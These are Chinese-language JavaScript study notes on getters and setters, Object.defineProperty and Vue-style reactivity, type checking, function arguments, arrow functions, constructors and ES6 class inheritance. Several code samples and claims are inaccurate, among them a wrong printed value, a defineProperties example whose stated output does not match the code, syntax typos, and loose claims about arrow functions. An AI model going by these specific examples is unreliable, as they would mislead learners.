- **get用法**

```jsx
     var user = {
         info: {
             name: "张三"
         },
         get name(){
             return this.info.name;
         }
     }
    console.log(user.info.name) // '张三'
    console.log(user.name) // '张三'
```

*作用：*
 (1). 在对象内属性嵌套层级过多时，可以直接在对象下读取到对应属性，简化调用；
 (2). 在get时可以任意设置属性名，可以不暴露组件内部属性名。

注：也就是user.name相当于调用get name（）的方法，然后拿到其返回值

- **set用法**

```jsx
   //vue就是利用这样来监听数据的该变的
	var user = {
      _name: '李三',
      get name() {
        return this._name
      },
      set name(val) {
        console.log('我改名了');
        this._name = val;
      }
    }
    console.log(user.name) // '张三'
    user.name = '李四'; // '我改名了'
    console.log(user.name) // '李四'
```

*作用：*
 (1). 在对象内属性嵌套层级过多时，可以直接在对象下设置到对应属性，简化层级；
 (2). set方法内的逻辑在赋值时会自动执行，可以监听属性值的改变

注：也就是user.name = '李四'相当于调用set name（val）的方法，然后重新赋值，'李四当作参数赋值给val'

​	还有一点，get和set不能访问自己的属性，比如set name()其中不能访问自身属性name,自身属性name不设置，会自动生成，如果有设置，也一样

```
var user = {
      // _name: '21',
      // get name() {
      //   return this._name
      // },
      name:'张三',
      set name(val) {
        console.log('我改名了');
        this.name = val;
      }
    }
    console.log(user.name) // undefined
```

**使用闭包改造**

```
var test2 = (function () {
      var _a = undefined
      var test = {
        get a(){
          console.log('getter');
          return _a
        },
        set a(newVal){
          console.log('setter');
          _a = newVal
        }
      }
      return test
    })()
    console.log(test2);
    test2.a = '3232'
```

结果：

![image-20210305041306216](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305041306.png)

![image-20210305041318033](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305041318.png)

2. 使用Object.defineProperty() 操作对象属性

   > 由于上面实现的监听器只能在定义对象时定义好，不能动态添加，所以我们需要使用Object.defineProperty()来动态添加
   >
   > ​	这是用来定义对象属性的，里面有三个参数
   > ​	object.defineProperty(object,属性,描述符)
   > ​	描述符分两种一个是数据描述符一个是存取描述符

   ```
   数据描述符{
   value："",
   configurable:false不能删除与重新定义，
   writeable：true允许修改属性
   enumerable：true允许变量循环
   }
   存取描述符
   get：function（）{
   return a
   }，
   set：function（b）{
   a=b
   }
   ```

   

```jsx
     var user = {}
     var _name = '张三'
     Object.defineProperty(user, ’name‘, {
         get(){
             return _name
         },
         set(val){
             console.log('我改名了');
             _name = val
         }
     })
     console.log(user.name) // '张三'
     user.name = '王二'; // '我改名了'
     console.log(user.name) // '王二'
```

*作用：*
 		set方法可以监听对应属性值的改变，vue的数据动态绑定就是通过这个方法实现的，监听到vue实例中的data属性发生改变时，在set方法中触发模版重新渲染逻辑。

**vue响应式简单实现：**

```
   //如何实现数据与视图绑定
    // 1、需要知道哪个数据改变了。一般我们可以使用数据访问对象的方法。在vue中我们使用的是es5的对象访问属性get/set
    // 2、修改视图
    var model = {
      a: 1,
      b: 2
    }
    // vm
    for (var key in model) {
      ; (function (key) {
        var value = model[key]
        Object.defineProperty(model, key, {
          get: function () {
            console.log('setter');
            return value
          },
          set: function (newVal) {
            value = newVal
            console.log('getter');
            render()
          }
        })
      })(key)
    }
    //view
    let render = (function render() {
      console.log('render执行了');
      document.body.innerHTML = '<div><h3>想显示一些文案</h3><p>a的值: ' + model.a + ',b的值：' + model.b + '</p></div>'
      return render
    })()
    console.log(model);
    setTimeout(() => {
      model.b = 3
    }, 2000);
```

**3. 使用Object.defineProperties()**

```jsx
     var user = {
         name: '张三'
     }
     Object.defineProperties(user, {
         nameGet: {
             value: function() {
                 console.log('读取');
                 return this.name;
             }
         },
         nameSet: {
             value: function(name) {
                 console.log('设置');
                 this.name = name;
             }
         }
     })
     console.log(user.nameGet) // '读取'  '张三'
     user.nameSet = '王二'; // '设置'
     console.log(user.nameSet) // '王二'
```

*作用：*
 和方法1直接在对象中设置效果和原理相似

###### Object.is()

> `Object.is()` 方法判断两个值是否为[同一个值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness)。

语法:

```
Object.is(value1, value2);
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/is#参数)

- `value1`

  被比较的第一个值。

- `value2`

  被比较的第二个值。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/is#返回值)

一个 [`Boolean`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean) 类型标示两个参数是否是同一个值。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/is#描述)

`Object.is()` 方法判断两个值是否为[同一个值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness)。如果满足以下条件则两个值相等:

- 都是 [`undefined`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined)
- 都是 [`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null)
- 都是 `true` 或 `false`
- 都是相同长度的字符串且相同字符按相同顺序排列
- 都是相同对象（意味着每个对象有同一个引用）
- 都是数字且
  - 都是 `+0`
  - 都是 `-0`
  - 都是 [`NaN`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN)
  - 或都是非零而且非 [`NaN`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN) 且为同一个值

与[`==` (en-US)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators) 运算*不同。* `==` 运算符在判断相等前对两边的变量(如果它们不是同一类型) 进行强制转换 (这种行为的结果会将 `"" == false` 判断为 `true`), 而 `Object.is`不会强制转换两边的值。

与[`===` (en-US)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators) 运算也不相同。 `===` 运算符 (也包括 `==` 运算符) 将数字 `-0` 和 `+0` 视为相等 ，而将[`Number.NaN`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Number/NaN) 与[`NaN`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN)视为不相等.

###### Object.assign()对象去重合并

> Object.assign(target, source_1, ···)
>
> 用于将源对象的所有可枚举属性复制到目标对象中。
>
> 在vue中可以实现响应式

**基本用法**

```
     let target = {a: 1};
     let object2 = {b: 2};
     let object3 = {c: 3};
     Object.assign(target,object2,object3);  
     // 第一个参数是目标对象，后面的参数是源对象
     target;  // {a: 1, b: 2, c: 3}
```

- 如果目标对象和源对象有同名属性，或者多个源对象有同名属性，则后面的属性会覆盖前面的属性。

- 如果该函数只有一个参数，当参数为对象时，直接返回该对象；当参数不是对象时，会先将参数转为对象然后返回。

  ```
  Object.assign(3);         // Number {3}
  typeof Object.assign(3);  // "object"
  ```

使用案例：

Object.assign({},oldobj,newobj)

注意。这里的Object是真的Object,不能改变，后面的是真实的对象名称

```
	oldobj{
		name:'zs'
		sex:''
	}
	newobj{
		age:18
		sex:"female"
	}
```

那么Object.assign({},oldobj,newobj)的结果就是

```
	{
		name:'zs',
		sex:'female',
		age:18
	}
```

如果oldobj有的属性而newobj没有，那以oldobj为准，如果newobj有的属性，不管oldobj有没有都会以newobj为准

###### hasOwnProperty

`hasOwnProperty()` 方法会返回一个布尔值，指示对象自身属性中是否具有指定的属性（也就是，是否有指定的键）。

```
     const object1 = {};
     object1.property1 = 42;

     console.log(object1.hasOwnProperty('property1'));
     // expected output: true

     console.log(object1.hasOwnProperty('toString'));
     // expected output: false

     console.log(object1.hasOwnProperty('hasOwnProperty'));
     // expected output: false
```

**参数**

- prop

  要检测的属性的 [`String`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String) 字符串形式表示的名称，或者 [`Symbol`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol)。

**返回值**

用来判断某个对象是否含有指定的属性的布尔值 [`Boolean`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean)。

**描述**

所有继承了 [`Object`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object) 的对象都会继承到 `hasOwnProperty` 方法。这个方法可以用来检测一个对象是否含有特定的自身属性；和 [`in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in) 运算符不同，该方法会忽略掉那些从原型链上继承到的属性。

**备注**

即使属性的值是 `null` 或 `undefined`，只要属性存在，`hasOwnProperty` 依旧会返回 `true`。

```
     o = new Object();
     o.propOne = null;
     o.hasOwnProperty('propOne'); // 返回 true
     o.propTwo = undefined;
     o.hasOwnProperty('propTwo'); // 返回 true
```

###### in

> 如果指定的属性在指定的对象或其原型链中，则**`in` 运算符**返回`true`。

语法

```
prop in object
```

参数

- `prop`

  一个字符串类型或者 symbol 类型的属性名或者数组索引（非symbol类型将会强制转为字符串）。

- `objectName`

  检查它（或其原型链）是否包含具有指定名称的属性的对象。

描述

下面的例子演示了一些 `in` 运算符的用法。

```
     // 数组
     var trees = new Array("redwood", "bay", "cedar", "oak", "maple");
     0 in trees        // 返回true
     3 in trees        // 返回true
     6 in trees        // 返回false
     "bay" in trees    // 返回false (必须使用索引号,而不是数组元素的值)

     "length" in trees // 返回true (length是一个数组属性)

     Symbol.iterator in trees // 返回true (数组可迭代，只在ES2015+上有效)


     // 内置对象
     "PI" in Math          // 返回true

     // 自定义对象
     var mycar = {make: "Honda", model: "Accord", year: 1998};
     "make" in mycar  // 返回true
     "model" in mycar // 返回true
```

`in`右操作数必须是一个对象值。例如，你可以指定使用`String`构造函数创建的字符串，但不能指定字符串文字。

```
     var color1 = new String("green");
     "length" in color1 // 返回true
     var color2 = "coral";
     "length" in color2 // 报错(color2不是对象)
```

对被删除或值为 undefined 的属性使用`in`

如果你使用 `delete` 运算符删除了一个属性，则 `in` 运算符对所删除属性返回 `false`。

```
     var mycar = {make: "Honda", model: "Accord", year: 1998};
     delete mycar.make;
     "make" in mycar;  // 返回false

     var trees = new Array("redwood", "bay", "cedar", "oak", "maple");
     delete trees[3];
     3 in trees; // 返回false
```

如果你只是将一个属性的值赋值为[`undefined`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined)，而没有删除它，则 `in` 运算仍然会返回`true`。

```
     var mycar = {make: "Honda", model: "Accord", year: 1998};
     mycar.make = undefined;
     "make" in mycar;  // 返回true
     var trees = new Array("redwood", "bay", "cedar", "oak", "maple");
     trees[3] = undefined;
     3 in trees; // 返回true
```

继承属性

如果一个属性是从原型链上继承来的，`in` 运算符也会返回 `true`。

```
	"toString" in {}; // 返回true
```

###### 判断对象类型

**方法一：采用typeof**

```
var fn = function(n){
          console.log(n);
       }
       var str = 'string';
       var arr = [1,2,3];
       var obj = {
           a:123,
           b:456
       };
       var num = 1;
       var b = true;
       var n = null;       var u = undefined;
       //方法一使用typeof方法。
       console.log(typeof str);//string
       console.log(typeof arr);//object
       console.log(typeof obj);//object
       console.log(typeof num);//number
       console.log(typeof b);//boolean
       console.log(typeof n);//null是一个空的对象
       console.log(typeof u);//undefined
       console.log(typeof fn);//function
```

通过上面的检测我们发现typeof检测的Array和Object的返回类型都是Object，因此用typeof是无法检测出来数组和对象的，采用方法二和方法三则可以检测出来

**方法二：采用instanceof**

在JS中，判断一个变量的类型，常常会用到`typeof`运算符，但当用来判断引用类型变量时，无论是什么类型的变量，它都会返回`Object`。为此，引入了`instanceof`。

`instanceof`相比与`typeof`来说，`instanceof`方法要求开发者明确的确认对象为某特定类型。即`instanceof`用于判断引用类型属于哪个构造函数的方法。

```js
var arr = []
arr instanceof Array // true
typeof arr // object, typeof 是无法判断是否为数组的
123
```

另外，更重的一点是 instanceof 可以在继承关系中用来判断一个实例是否属于它的父类型。

```js
// 判断 f 是否是 Foo 类的实例 , 并且是否是其父类型的实例
function Aoo(){} 
function Foo(){} 
Foo.prototype = new Aoo();//JavaScript 原型继承
 
var f = new Foo(); 
console.log(f instanceof Foo)//true 
console.log(f instanceof Aoo)//true
```

`f instanceof Foo` 的判断逻辑是：

- f 的 `__proto__`一层一层往上，是否对应到 `Foo.prototype`
- 再往上，看是否对应着`Aoo.prototype`
- 再试着判断 `f instanceof Object`

即`instanceof`可以用于判断多层继承关系。

下面看一组复杂例子

```js
console.log(Object instanceof Object) //true 
console.log(Function instanceof Function) //true 
console.log(Number instanceof Number) //false 
console.log(String instanceof String) //false 
console.log(Array instanceof Array) // false
 
console.log(Function instanceof Object) //true 
 
console.log(Foo instanceof Function) //true 
console.log(Foo instanceof Foo) //false
```

在这组数据中，Object、Function instanceof 自己为true， 其他的instanceof自己都为false，这就要从instanceof的内部实现机制以及JS原型继承机制讲起。

**1. instanceof的内部实现机制**

instanceof的内部实现机制是通过判断对象的原型链上是否能找到对象的 `prototype`

```js
// instanceof 的内部实现 
function instance_of(L, R) {//L 表示左表达式，R 表示右表达式，即L为变量，R为类型
 // 取 R 的显示原型
 var prototype = R.prototype
 // 取 L 的隐式原型
 L = L.__proto__
 // 判断对象（L）的类型是否严格等于类型（R）的显式原型
 while (true) { 
   if (L === null) 
     return false
   if (prototype === L)// 这里重点：当 prototype 严格等于 L 时，返回 true 
     return true
   L = L.__proto__
 } 
}
```

instanceof不能区分基本类型string和boolean,除非是字符串对象和布尔对象。如下所示。

```
var c='abc';
c instanceof String; //false
var d=new String();
d instanceof String  //true
```

**方法三：使用constructor**

```
var o={};
o.constructor==Object  //true
var arr=[];
arr.constructor==Array  //true
arr.constructor==Object //false
```

可以看出constructor可以区分Array和Object。

```
var n=true;
n.constructor==Boolean  //true
var num=1;
num.constructor==Number  //true
var str='hello world';
str.constructor==String     //true
var num=new Number();
num.constructor==Number   //true
```

不过要注意，constructor属性是可以被修改的，会导致检测出的结果不正确

```
function Person(){
  
}
function Student(){
  
}
Student.prototype = new Person();
var John = new Student();
console.log(John.constructor==Student); // false
console.log(John.constructor==Person); // true
```

除了undefined和null，其他类型的变量均能使用constructor判断出类型.

**方法四：Object.prototype.toString.call()  ---------最好用**

```
Object.prototype.toString.call(123)
//"[object Number]"

Object.prototype.toString.call('str')
//"[object String]"

Object.prototype.toString.call(true)
//"[object Boolean]"

Object.prototype.toString.call({})
//"[object Object]"

Object.prototype.toString.call([])
//"[object Array]"
Object.prototype.toString.call(null)
//"[object Null]"
```

封装一个判断数组和对象的方法

```
function typeObj(obj){
      var type=Object.prototype.toString.call(obj);
      if(type=='[object Array]'){
        return 'Array';
      }elseif(type=='[object  Object]'){
        return 'Object';
      }else{
        return "obj is not object or array"
      }
}
```

Object.prototype.toString方法的在被调用的时候，会执行如下的操作步骤： 

1. 获取对象的类名（对象类型）。 

​      [[Class]]是一个内部属性,所有的对象(原生对象和宿主对象)都拥有该属性.在规范中,[[Class]]是这么定义的: 
​            内部属性,[[Class]] 一个字符串值,表明了该对象的类型。

2. 然后将[object 获取的对象类型的名]组合为字符串 
3. 返回字符串 “[object Array]” 。

这个[[Class]]是内部属性，我们不能直接通过对象.[[Class]]获取，但是我们能通过Object.prototype.toString获取

###### enumerable

当且仅当该属性的 `enumerable` 键值为 `true` 时，该属性才会出现在对象的枚举属性中。
**默认为 `false`**。

###### Object.defineProperty()

基本使用（添加属性）：

```
import moment from 'moment';
Object.defineProperty(Vue.prototype, '$moment', { value: moment });
```

相当于：

```
import moment from 'moment';
Vue.prototype.$moment= moment
```

defineProperty可以在vue中实现对象属性响应式，也就是增加原来没有定义的属性也能实现响应式



###### 对象的方法扩展（ES8)

keys、values、entries

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305155212.png" alt="image-20201108113724277" style="zoom:80%;" />

输出结果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215643.png" alt="image-20201108113747705" style="zoom:80%;" />

##### 函数

> 函数也是一个对象，函数中可以封装一些功能（代码），在需要的时候可以执行这些（代码）

###### 创建函数对象

**方式一：**(很少使用)

> ​	可以将要封装的代码以字符串的形式传递给构造函数

```
		var fun = new Function("console.log('hello World')")
```

**方式二：**（推荐使用）

> 使用函数声明来创建一个函数

```
		function fun(){
			console.log('hello world')
		}
```

​	使用函数声明来创建函数（其他方式不会）会在所有的代码执行之前就被创建，`函数声明提前会在变量提升之后,变量提升会快于函数提升`

**方式三：**

> 使用函数表达式 来创建一个函数

```
		var fun = function(){
			console.log('hello world')
		}
```

**立即执行函数**

> 函数定义完，立即被调用，立即执行函数往往只调用一次	

```
		(function (){
			console.log('hello world')
		})()
		(function (a,b){
			console.log(a+b)
		})()
```

###### 函数参数

函数的实参可以是任意的类型

```
	function sum(a,b){
		return a+b
	}
	//相当于
	function sum(a,b){
		var a ,b //代码块会自动定义变量
		return a+b
	}
```

调用函数时，解析器不会检查实参的类型，

​	所以要注意，是否有可能会接收到非法的参数，如果有可能则需要对参数进行类型的检查

调用函数时，解析器也不会检查实参的数量

​	`多余实参不会被赋值`

`如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined`

```
	function sum(a,b){
		console.log(a) //10
		console.log(b) //undefined
		//return只能返回一个值，如果返回多个，则只取最后一个返回
		return a,b
	}
	console.log(sum(10)) //undefined
```

参数默认值

```
function foo(x, y = 10){
	console.log(x, y)  //5 10
}
foo(5)
function foo2(x. y = x) {
	console.log(y)      //2
}
foo2(2)
let x = 1
function foo3(y = x) {
	let x = 2
	console.log(y)       //1
}
foo3()
//这里的y只会去全局或者函数参数取，不会拿函数内部的
function name(x = y) {   //报错，y is not defined
  var y = 10
  console.log(x);
}
name()
```

解构赋值

```
function foo({x, y = 5}){
	console.log(x, y)   //1 5
}
foo({x:1})

//注意，对象解构赋值按字段来匹配，不是按顺序的
function foo2 ({ x, y = 5 }) {
  console.log(x, y)   //2 1
}
foo2({ y: 1, x: 2 })
```

函数length属性

```
function test(a, b, c) {}
console.log(test.length);   //3
```

函数的name属性

```
function foo() {}
console.log(foo.bind({}).name)   //bound foo
```

###### arguments参数

1、函数的参数arguments 对象

-- arguments 表示函数的实际参数（与形参无关）

```
   // js中 函数的参数：形参、实参
    function test(a, b, c, d) {
      // 函数名.length 等价于 arguments.callee.length，因为arguments.callee代表函数本身， 程序开发中建议使用后者
      console.log(test.length); // 4 ,函数形式参数的数量
      console.log(a);   //10
      console.log(b);   //20
      console.log(c);   //undefined
      console.log(d);   //undefined
      // 函数的实际参数，内部就是用一个数组去接收函数的实际参数
      // arguments 对象 可以访问函数的实际参数
      // arguments 对象 只能在函数的内部访问和使用
      console.log(arguments.length); // 获取 函数 的实参 的数量 test(10,20) 输出为：2
      console.log(arguments[0]); // 获取第一个 实参 的值 test(10,20) 输出为：10
      console.log(arguments[1]); // 获取第二个 实参 的值 test(10,20) 输出为：20
    }
    test(10, 20);
```

2、callee函数（回调函数属性）

-- arguments 对象的秘密属性，callee属性

--这个属性比较奇怪，它能返回arguments对象所属的函数的引用，这相当于在自己的内部调用自己

-- arguments 对象用得最多的还是做递归操作

```
     function fun(){
       console.log(arguments.callee === fun);  //true
     }
     fun('tom',[1,2,3],{name:'Janny'});
```



```
     function fact(num){
      if(num <= 1){
       return 1;
      }else{
       return num * arguments.callee(num-1);
      }
     }
     console.log(fact(5)); // 120
```

箭头函数中没有arguments，我们可以用剩余参数...rest实现

```
// js中 函数的参数：形参、实参
    let  test = (...rest) => {
      console.log(...rest); //10,20
      console.log(arguments); // 报错，arguments未被定义
    }
    test(10, 20);
```

###### 函数返回值

`return 只能返回一个值，如果有多个，则只取最后一个返回`

```
	function sum(a,b){
		//return只能返回一个值，如果返回多个，则只取最后一个返回
		return a,b
	}
	console.log(sum(10)) //undefined
```

虽然return 只能返回一个值，但是我们可以返回对象或者数组等数据类型来间接返回多个值

```
	function sum(a,b){
		return {a,b}
	}
	console.log(sum(10).a,sum(10).b}) //10,undefined
```

`注：函数都是有返回值的`

​	`1、如果有return则返回return后面的值`

​	`2、如果没有return则返回undefined`

###### break、continue、return的区别

break: 结束当前的循环体(如：for、while)

continue:跳出循环，继续执行下一次循环（如：for、while）

return: 不仅可以退出循环，还能够返回return语句中的值，同时还可以结束当前的函数体内的代码

###### 箭头函数

()=>{}
箭头函数又称匿名函数，不能作为构造函数,不能使用new

```javascript
     let f = () =>{
          console.log('123')
     }
     let fc = new f();  //这一行报错 f is not a constructor
```

箭头函数会捕获父类的上下文来作为自己的this值
		普通函数的this指向调用它的那个对象

```javascript
     var a = 20;
     var obj = {
          a:10,
          b:()=>{
               console.log(this.a);
          },
          c:function(){
               console.log(this.a);
          }
     }
     obj.b(); // 20
     obj.c(); // 10
```

箭头函数没有原型

```javascript
     var a = ()=>{
          return 1;
     }
     function b(){
          return 2;
     }
     console.log(a.prototype) // undefined
     console.log(b.prototype) // {constructor:f}
```

箭头函数的this永远指向调用者的父类的上下文,任何方法都改变不了指向,比如 `call()` , `apply()` , `bind()`

普通函数的this指向调用它的那个对象

```
call()` `apply()` `bind()` 的用法和区别
call,apply,bind 它们在功能上没有区别的,都是改变this的指向,它们的区别主要是用于方法是实行形式和参数传递上的不同。call和apply方法都是在调用之后立即执行的,而bind调用之后是返回原函数`call()` `apply()`,需要再调用一次才行`bind(m)()
```

###### 函数的重载

> 重载，简单说，就是函数或者方法有相同的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。

js函数重载的简单实现

```
function overLoading() {
　　// 根据arguments.length，对不同的值进行不同的操作
　　switch(arguments.length) {
　　　　case 0:
　　　　　　/*操作1的代码写在这里*/
　　　　　　break;
　　　　case 1:
　　　　　　/*操作2的代码写在这里*/
　　　　　　break;
　　　　case 2:
　　　　　　/*操作3的代码写在这里*/
 　　　　　　
　　//后面还有很多的case......
}

}
```

###### 函数的柯里化

> 维基百科上说道：柯里化，英语：Currying(果然是满满的英译中的既视感)，是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数而且返回结果的新函数的技术。

看这个解释有一点抽象，我们就拿被做了无数次示例的add函数，来做一个简单的实现。

```
// 普通的add函数
function add(x, y) {
    return x + y
}

// Currying后
function curryingAdd(x) {
    return function (y) {
        return x + y
    }
}
add(1, 2)           // 3
curryingAdd(1)(2)   // 3
```

实际上就是把add函数的x，y两个参数变成了先用一个函数接收x然后返回一个函数去处理y参数。现在思路应该就比较清晰了，就是只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数。

但是问题来了费这么大劲封装一层，到底有什么用处呢？没有好处想让我们程序员多干事情是不可能滴，这辈子都不可能.



##### 类

> 在JavaScript中，`类本质上还是构造函数`

###### 构造函数

> `构造函数就是一个普通的函数`，创建方式和普通函数没有区别,不同的是构造函数习惯上首字母大写

**构造函数和普通函数的区别就是调用方式的不同**

​	**普通函数是直接调用，而构造函数需要使用new关键字来调用**(`当然构造函数和普通函数均能直接调用和使用new 关键字来调用`)

```
   function test(name) {
      this.name = name
      console.log('我是函数test');
    }
    //构造函数的方式调用
    let test1 = new test('刘德华')
    // 普通函数的方式直接调用
    let test2 = test('张学友')
    console.log(test1);
    console.log(test2);
```

执行结果：

![image-20210815151127354](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815151128.png)

```
	function Test(name) {
      this.name = name
      console.log('我是函数Test');
    }
    //构造函数的方式调用
    let Test1 = new Test('刘德华')
    // 普通函数的方式直接调用
    Test()
    console.log(Test1);
```

执行结果：

![image-20201226152354911](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305155203.png)

由上面代码执行结果可以看出，`构造函数就是普通函数，普通函数也是构造函数，只是调用方式不一样而已，一般情况构造函数习惯上首字母大写，`

`但是这并不是必须条件`

构造函数的执行流程：

​	1、立刻创建一个新的对象

​	2、将新建的对象设置为函数中的this

​	3、逐行执行函数中的代码

​	4、将新建的对象作为返回值返回

使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类

1、使用构造函数

```
     <script>
         function Phone(brand,price) {
           this.brand=brand;
           this.price=price;
           //创建公用方法
           Phone.prototype.call=function(){
             console.log('打电话');
           }
         }
         // 实例化对象
         let Huawei=new Phone('华为',2999);
         Huawei.call();
         console.log(Huawei);
      </script>
```

输出：

![image-20201108083319654](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305155159.png)

**默认情况下，没有return的函数的返回值为undefined（即没有定义返回值），如果定义了return，则返回指定对象。**
**但是构造函数比较t特殊，new构造函数在没有return的情况下默认返回新创建的对象。**在有return的情况下，需要分为两个情况考虑：

如果返回值为基本数据类型（string，number，boolean，undefined，null），那么返回值为新建对象实例，即this。

```
var a = function S(){
　　this.x=3;
　　return 1;
}
var b = new a();
console.log(a); //{x:3}
```

如果返回值为一个非基本数据类型的对象，函数的返回值为指定的对象，this值所引用的对象被丢弃。

```
var a = function S(){
　　this.x=3;
　　return a;
}
var b = new a();
console.log(b); //S(){this.x=3;return a }
```

直观的例子：

```
var a = function User( name, age){
　　this.name = name;
　　this.age = age;

　　// return; // 返回 this
　　// return null; // 返回 this
　　// return this; // 返回 this
　　// return true; // 返回 this
　　// return 'string'; // 返回 this
　　// return 1; // 返回 this
　　// 以上都返回{name:"哈哈",age:18}
　　// return []; // 返回 新建的 []
　　// return function(){}; // 返回 新建的 function，抛弃 this
　　// return new Boolean(false); // 返回 新建的 boolean，抛弃 this
　　// return new String('hello world'); // 返回 新建的 string，抛弃 this
　　// return new Number(32); // 返回新的 number，抛弃 this
}
var b=new a("哈哈",18)
console.log(b);
```

###### ES6Class

使用ES6中提供的class完成上面的功能

```
  class Phone {
      //构造方法，名字不能修改
      constructor(brand, price) {
        this.brand = brand;
        this.price = price;
      }
      //方法必须使用该语法，放在原型上
      call() {
        console.log('我可以打电话');
      }
      //这样方法在每个实例对象上
      call2 = function () {
        console.log('我可以打电话2');
      }
      //类中可以直接写赋值语句，如下代码的含义是:给类的实例对象都添加一个属性，名为name,值为'Phone类',如果是大家共有的那么就可以这样写
      phoneName = 'Phone类'
    }
    let k30 = new Phone('xiaomi', 2999);
    k30.call()                    //我可以打电话
    console.log(k30);	         //Phone { name: 'Phone类', brand: 'xiaomi', price: 2999 }
    console.log(k30.phoneName)    //Phone类
    console.log(Phone.phoneName); //undefined
```

constructor相当于构造函数，一旦new这个类，就会执行该构造函数，方法的话相当于构造函数的 Phone.prototype.call=function(){
           console.log('我可以打电话');
         }

输出结果：
<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210328145409.png" alt="image-20201108084128374" style="zoom: 80%;" />

实例对象和构造函数和类的方法和属性是不相通的，实例对象和它们的原型是相通的

**利用构造函数实现继承**

1、组合继承模式

```
    function Phone(brand,price) {
      this.brand=brand;
      this.price=price;
      Phone.prototype.call=function(){
      	console.log('打电话');
    	}
    }
    // 智能手机
    function SmartPhone(brand,price,color,size) {
    	//调用父类
      Phone.call(this,brand,price);
      this.color=color;
      this.size=size;
    }
    //设置子级构造函数的原型
    SmartPhone.prototype=new Phone();//这样就能形成原型链，进而实现继承
    //增强对象，弥补因重写原型而失去的默认的constructor 属性
    SmartPhone.prototype.constructor = SmartPhone
    //声明子类的方法
    SmartPhone.prototype.photo=function () {
      console.log('拍照功能');
    }
    const iPhone=new SmartPhone('iphone12',7777,'red','5.5')
    iPhone.photo()	 //拍照功能
    iPhone.call();   //打电话
    console.log(iPhone);
```

输出：

![image-20201108091316987](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210328145417.png)

继承实现原理

![image-20210105224942582](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305155154.png)

2、寄生式继承

​	*//组合继承的缺点：需要两次调用Phone的构造函数，从而导致brand和price属性冗余，在Phone中存在一份，在Phone.prototype中又存在一份，只不过是sub把super里的属性覆盖了*

![image-20210815152921103](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815152922.png)

```
     //采用寄生式继承模式可以解决上述问题
     function inheritPrototype(subClass, superClass){
		function F(){}
		F.prototype = superClass.prototype
		subClass.prototype = new F()
		//上面的b.constructor指向的是构造函数，但是如果构造函数原型被重写，b.constructor !== fun了，原因是指针指向的其实是原型对象。所以：实例化对象的				//constructor对象不是任何时候都指向构造函数本身，除非构造函数的原型一直不变，如果构造函数原型重写，全等关系就破灭了。
		subClass.prototype.constructor = subClass;  //增强对象，弥补因重写原型而失去的默认的constructor 属性
	}
	inheritPrototype(smartPhone,Phone)
```

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305155150.png" alt="image-20210205235210961" style="zoom: 67%;" />

利用class extends实现类的继承

```
 	class Phone{
        //构造方法
        constructor(brand,price){
          this.price=price;
          this.brand=brand;
        }
        //父类的成员属性
        call(){
          console.log('打电话功能');
        }
      }
      class SmartPhone extends Phone{
        //构造方法
        constructor(brand,price,color,size){
        	//这里的作用是给相当于给父类的this设置为新new的实例对象，不然就为undefined，因为我们子类实例调用父类的方法，父类这时是没有this的
        	//super相当于调用父元素的构造函数，super必须放在构造器的第一行
          super(brand,price);//相当于Phone.call(this,brand,price)
          this.color=color;
          this.size=size;
        }
        //重写从父类继承过来的方法,这样就不会去读取父类的call方法了
        //call(){
        // console.log('智能手机打电话功能');
        //}
        photo(){
          console.log('拍照功能');
        }
      }
      let iPhone=new SmartPhone('iphone12',7777,'黑色','6.1')
      iPhone.call()
      iPhone.photo();
      console.log(iPhone);
```

![image-20201108092226309](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210328145429.png)

`注意：`

​	1、在ES6类中没有变量提升，所以必须先定义类，才能通过类实例化对象

​	2、类里面的共有的属性和方法一定要加this使用

```
   class Star {
    constructor(uname,age){
      this.uname = uname
      this.age = age
      sing() //报错
    }
    sing(){
      console.log(uname); //报错
    }
  }
  let ldh = new Star ('刘德华')
  ldh.sing() 
```

结果：

